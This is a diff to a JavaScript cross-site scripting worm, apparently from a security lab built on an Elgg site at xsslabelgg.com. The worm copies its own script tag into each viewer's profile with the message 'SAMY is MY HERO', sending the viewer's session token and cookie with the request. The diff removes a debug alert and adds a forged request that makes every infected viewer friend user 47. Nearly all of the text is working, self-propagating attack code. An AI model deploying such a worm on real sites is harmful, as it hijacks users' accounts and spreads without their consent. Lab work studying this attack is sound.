@@ -4,7 +4,6 @@ window.onload = function(){
 var headerTag="<script id=\"worm\" type=\"text/javascript\">";
 var jscodeTag=document.getElementById("worm").innerHTML;
 var footerTag="</"+"script/>";
-alert("inner code</br>" + jscodeTag );
 
 var wormcode= encodeURIComponent(headerTag+jscodeTag+footerTag);
 var desc="&description=SAMY+is+MY+HERO"+ wormcode;
@@ -32,6 +31,16 @@ Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");
 content=ts+token+desc+name+guid;
 Ajax.send(content);
+
+
+//Construct the HTTP request to add Samy as a friend.
+var friendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + token + ts;
+//Create and send Ajax request to add friend
+Ajax=new XMLHttpRequest();
+Ajax.open("GET",friendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.send();
 }
 }
 </script>
